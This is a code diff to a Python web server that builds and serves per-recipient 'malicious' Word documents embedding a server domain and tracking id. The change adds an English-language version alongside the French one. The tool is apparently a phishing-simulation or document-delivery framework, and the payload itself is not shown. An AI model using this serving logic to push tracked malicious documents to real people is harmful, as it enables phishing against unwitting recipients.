@@ -147,14 +147,19 @@ def setMaliciousfile(nameorigfile, domain, rid):
 			nouveaudoc.write(absoluname, arcname)
 	nouveaudoc.close()
 
-def downloadfile(getobj, rid):
+def downloadfile(getobj, rid, lang="fr"):
+	currentfile = ""
+	if lang == "fr":
+		currentfile = NAME_MALICIOUS_BASIC_FILE
+	else:
+		currentfile = NAME_MALICIOUS_BASIC_FILE_EN
 	if BASICFOLDER == (BASICFOLDER+rid):
 		return
 	if (not re.match("^[A-Za-z0-9_-]*$", rid)) and (not rid.isalpha()):
 		return
-	with open(BASICFOLDER+rid+'/'+NAME_MALICIOUS_BASIC_FILE, 'rb') as f:
+	with open(BASICFOLDER+rid+'/'+currentfile, 'rb') as f:
 		getobj.send_header("Content-Type", 'application/msword')
-		getobj.send_header("Content-Disposition", 'attachment; filename="{}"'.format(os.path.basename(BASICFOLDER+rid+'/'+NAME_MALICIOUS_BASIC_FILE)))
+		getobj.send_header("Content-Disposition", 'attachment; filename="{}"'.format(os.path.basename(BASICFOLDER+rid+'/'+currentfile)))
 		fs = os.fstat(f.fileno())
 		getobj.send_header("Content-Length", str(fs.st_size))
 		getobj.end_headers()
@@ -273,8 +278,8 @@ class LaSuperGestiondeRequete(SimpleHTTPRequestHandler):
 				self.send_response(200)
 				rid = query_components["riden"]
 				if rid != "":
-					setMaliciousfile(NAME_MALICIOUS_BASIC_FILE, ADDRESS_SERVER, rid)
-					downloadfile(self, rid)
+					setMaliciousfile(NAME_MALICIOUS_BASIC_FILE_EN, ADDRESS_SERVER, rid)
+					downloadfile(self, rid, lang="en")
 			elif "superrid" in query_components:
 				if AUTH != True:
 					superrid = query_components["superrid"]
